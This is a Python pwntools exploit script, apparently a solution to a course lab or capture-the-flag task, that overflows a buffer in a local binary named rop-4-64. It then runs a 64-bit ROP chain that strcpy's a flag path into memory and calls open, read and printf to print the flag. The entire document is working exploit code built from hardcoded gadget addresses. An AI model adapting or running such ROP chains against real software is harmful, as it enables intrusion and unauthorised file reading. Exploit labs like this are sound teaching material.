from pwn import *
import string

GARB = 'bbbbbbbb'

# Addresses needed for the attack
pop_rdi_ret_addr = 0x400863 # From ROPgadget --binary ./rop-4-64
pop_rdx_pop_rbp_ret_addr = 0x40073f # From ROPgadget --binary ./rop-4-64
pop_rsi_pop_r15_ret_addr = 0x400861 # From ROPgadget --binary ./rop-4-64
open_addr = ELF('./rop-4-64').symbols['open']
read_addr = ELF('./rop-4-64').symbols['read']
printf_addr = ELF('./rop-4-64').symbols['printf']
strcpy_addr = ELF('./rop-4-64').symbols['strcpy']
data_start_addr = 0x601050 # Address of the answer
tqbf_addr =  0x400890 # Address of the letters string
slash_addr = 0x400908 # Address of the slash
number_addr = 0x4008d9  # Address of the numbers string
null_addr =  0x4008e4 # Address of null terminator

# Constants needed for attack
tqbf = "the quick brown fox jumps over the lazy dog!"
number = "1234567890-"


# Build a ropchain to strcpy path into data_start_addr
def create_string(path):
    inp = 'a' * 0x80 + GARB
    data_curr_addr = data_start_addr

    for letter in path:
        if letter in string.ascii_lowercase:
            letter_index = tqbf.find(letter)
            inp = inp + p64(pop_rdi_ret_addr) + p64(data_curr_addr) + p64(pop_rsi_pop_r15_ret_addr) + p64(tqbf_addr + letter_index) + GARB + p64(strcpy_addr)

        elif letter in string.digits or letter == '-':
            letter_index = number.find(letter)
            inp = inp + p64(pop_rdi_ret_addr) + p64(data_curr_addr) + p64(pop_rsi_pop_r15_ret_addr) + p64(number_addr + letter_index) + GARB + p64(strcpy_addr)

        else:
            inp = inp + p64(pop_rdi_ret_addr) + p64(data_curr_addr) + p64(pop_rsi_pop_r15_ret_addr) + p64(slash_addr) + GARB + p64(strcpy_addr)

        data_curr_addr = data_curr_addr + 1

    inp = inp + p64(pop_rdi_ret_addr) + p64(data_curr_addr) + p64(pop_rsi_pop_r15_ret_addr) + p64(null_addr) + GARB + p64(strcpy_addr)

    return inp

# Build rop chain
inp = create_string('/home/labs/week5/rop-4-64/flag')
inp = inp + p64(pop_rdi_ret_addr) + p64(data_start_addr) + p64(pop_rsi_pop_r15_ret_addr) + p64(0) + GARB + p64(open_addr)
inp = inp + p64(pop_rdi_ret_addr) + p64(3) + p64(pop_rsi_pop_r15_ret_addr) + p64(data_start_addr) + GARB + p64(pop_rdx_pop_rbp_ret_addr) + p64(100) + GARB + p64(read_addr)
inp = inp + p64(pop_rdi_ret_addr) + p64(data_start_addr) + p64(printf_addr)

# Launch processs and send rop chain
p = process('./rop-4-64')
p.send(inp)

# Print flag
p.interactive()
